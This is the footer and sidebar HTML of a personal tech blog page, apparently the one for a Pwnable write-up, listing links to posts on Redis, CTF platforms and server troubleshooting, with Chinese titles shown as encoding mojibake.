<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/Redis/" title="åˆ†ç±»äº Redis">Redis</a>
</div>

    <span><a href="/2024/10/3391040452.html" title="Redisæºç å­¦ä¹ -Ziplist">Redisæºç å­¦ä¹ -Ziplist</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="åˆ†ç±»äº ç½‘ç»œå®‰å…¨">ç½‘ç»œå®‰å…¨</a>
</div>

    <span><a href="/2020/12/21012.html" title="Pwnableé¢˜è§£">Pwnableé¢˜è§£</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%9D%82%E8%AE%B0/" title="åˆ†ç±»äº æ‚è®°">æ‚è®°</a>
</div>

    <span><a href="/2020/10/58699.html" title="Pycharm+VMwareæ­å»ºLinuxä¸‹å¼€å‘ç¯å¢ƒ">Pycharm+VMwareæ­å»ºLinuxä¸‹å¼€å‘ç¯å¢ƒ</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="åˆ†ç±»äº ç½‘ç»œå®‰å…¨">ç½‘ç»œå®‰å…¨</a>
</div>

    <span><a href="/2022/09/13394.html" title="CTFd+CTFd-Whaleéƒ¨ç½²å®è·µ">CTFd+CTFd-Whaleéƒ¨ç½²å®è·µ</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" title="åˆ†ç±»äº åç«¯å¼€å‘">åç«¯å¼€å‘</a>
</div>

    <span><a href="/2022/12/20899.html" title="ä¸€æ¬¡ç”±äºæœåŠ¡å™¨æ—¶é—´å¼‚å¸¸å¼•èµ·çš„æœåŠ¡æŠ¥é”™é—®é¢˜æ’æŸ¥">ä¸€æ¬¡ç”±äºæœåŠ¡å™¨æ—¶é—´å¼‚å¸¸å¼•èµ·çš„æœåŠ¡æŠ¥é”™é—®é¢˜æ’æŸ¥</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>æœ€æ–°è¯„è®º</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2023 â€“ 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-a1oyss"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">a1oyss @ a1oyss's blog</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">111k å­—</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">1:41</span>
  </div>
  <div class="powered-by">
    åŸºäº <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2020/12/21012.html',
    favicon: {
      show: "a1oyss's blog",
      hide: "a1oyss's blog"
    },
    search : {
      placeholder: "æ–‡ç« æœç´¢",
      empty: "å…³äº ã€Œ ${query} ã€ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœåˆ°",
      stats: "${time} ms å†…æ‰¾åˆ° ${hits} æ¡ç»“æœ"
    },
    valine: true,fancybox: true,
    copyright: 'å¤åˆ¶æˆåŠŸï¼Œè½¬è½½è¯·éµå®ˆ <i class="ic i-creative-commons"></i>BY-NC-SA åè®®ã€‚',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
